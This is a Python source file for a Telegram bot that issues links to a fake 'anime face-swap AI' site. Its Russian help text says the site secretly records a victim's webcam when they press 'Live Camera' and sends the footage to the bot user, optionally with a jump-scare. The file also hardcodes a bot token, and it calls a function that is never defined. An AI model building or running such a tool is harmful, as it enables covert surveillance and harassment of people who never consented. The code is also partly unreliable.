from threading import Thread
import asyncio

import uvicorn

from api.api import app

import telebot

bot = telebot.TeleBot("7462346035:AAF60-_oMbOaJQwIdRpkM63KpC-Ayx0eEzk")

@bot.message_handler(commands=['start', 'help'])
def start_message(message):
  bot.send_message(message.chat.id,'Привет!\nЭтот бот генерирует ссылку на фейковый сайт с нейросетью которая якобы меняет твое лицо\nКогда жертва нажмет кнопку "Live Camera" начнется запись с веб камеры жертвы и будет отправлена этим ботом тебе, а тем временем у жертвы будет бесконечная загрузка\nТакже можно сгенерировать ссылку со скримером\n\n/gen - Сгенерировать ссылку без скримера\n/gen_screamer - Сгенерировать ссылку со скримером\n/help - Помощь')

@bot.message_handler(commands=["gen"])
def gen(message):
    bot.send_message(message.chat.id, f'https://anime-art-ai.vercel.app/?model={message.from_user.id}')

@bot.message_handler(commands=["gen_screamer"])
def gen(message):
    bot.send_message(message.chat.id, f'https://anime-art-ai.vercel.app/?model={message.from_user.id}&v2=true')


@bot.message_handler()
def unknown_command(message):
    bot.send_message(message.chat.id, "Я тебя не понимаю(\nНапиши /help")


def sendNotification(creator_id: int):
    bot.send_message(creator_id, "Жертва")


def bot_thread():
    bot.infinity_polling()

def start_uvicorn(loop):
    config = uvicorn.Config(app, loop=loop)
    server = uvicorn.Server(config)
    loop.run_until_complete(server.serve())


if __name__ == "__main__":
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    start_printing_app(loop)
    start_uvicorn(loop)
    Thread(target=bot_thread).start()
    uvicorn.run("api.api:app", port=8000, reload=True)

